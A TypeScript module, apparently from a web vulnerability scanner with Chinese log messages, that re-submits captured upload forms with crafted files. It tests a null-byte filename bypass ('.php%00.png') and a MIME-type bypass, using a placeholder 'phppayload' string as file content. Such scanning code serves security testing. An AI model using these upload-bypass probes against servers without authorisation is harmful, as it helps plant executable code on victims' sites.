// FILEPATH: /path/to/FileExtensionOperation.ts

import { Fuzz, FuzzParam, ParamType, str } from '@24wings/core';
import { contentType } from '@std/media-types/content-type';
import { extension } from '@std/media-types/extension';
import { extname } from '@std/path/extname';

export async function endpoint(request: Request) {
  if (request.method.toLocaleLowerCase() != 'post') {
    return;
  }
  // 检查Content-Type是否为表单格式
  const contentType = request.headers.get('content-type');
  if (!contentType || !contentType.includes('multipart/form-data')) {
    return new Response('Unsupported Media Type', { status: 415 });
  }

  console.log('form表单,开始探测form上传问题');

  const fuzz = new Fuzz(request.clone());
  await fuzz.initialize();
  const formParams = fuzz.getAllFuzzableParams().filter((p) => p.position == ParamType.File);
  let params = fuzz.getAllParams();
  const formData = await request.clone().formData();
  const fuzzParams: FuzzParam[] = [];
  console.log(formParams);
  for (const [name, value] of formData.entries()) {
    if (value instanceof File) {
      console.log(`检测到文件上传: ${name}, 文件名: ${value.name}`);
      // 这里可以添加更多的文件处理逻辑
      let exsitFile = formParams.find((p) => p.name == name);
      if (exsitFile) {
        fuzzParams.push(exsitFile);
      }
    } else {
      console.log(`表单字段: ${name}, 值: ${value}`);
    }
  }
  for (let p of fuzzParams) {
    await nullCheck(p, fuzz);
    await mimeTypeByPass(p, fuzz);
  }

  console.log(fuzzParams);
}

async function nullCheck(p: FuzzParam, fuzz: Fuzz) {
  let form = new FormData();
  let file = p.value as any as File;
  console.log(p.name);
  form.append(p.name, new File([new TextEncoder().encode('phppayload')], str.generateRandomString(5) + file.name + '.php' + '%00.png', { type: 'text/html' }));

  let res = await fuzz.fuzzPostRaw(form);
  if (res.status == 200) {
    console.log('上传成功,有nullcheck漏洞');
    console.log(await res.text());
  } else {
    console.error(await res.text());
  }
}

async function mimeTypeByPass(p: FuzzParam, fuzz: Fuzz) {
  let form = new FormData();
  let file = p.value as any as File;

  console.log(p.name,(p.value as any as File).name);
  let mimeType = contentType(extname((p.value as any as File).name) as string);
  console.log('mimeType',mimeType);
  form.append(p.name, new File([new TextEncoder().encode('phppayload')], str.generateRandomString(5) + file.name, { type: mimeType }));
  let res = await fuzz.fuzzPostRaw(form);
  if (res.status == 200) {
    console.log('上传成功,有mimeTypeBypass漏洞');
    console.log(await res.text());
  } else {
    console.error(await res.text());
  }
}
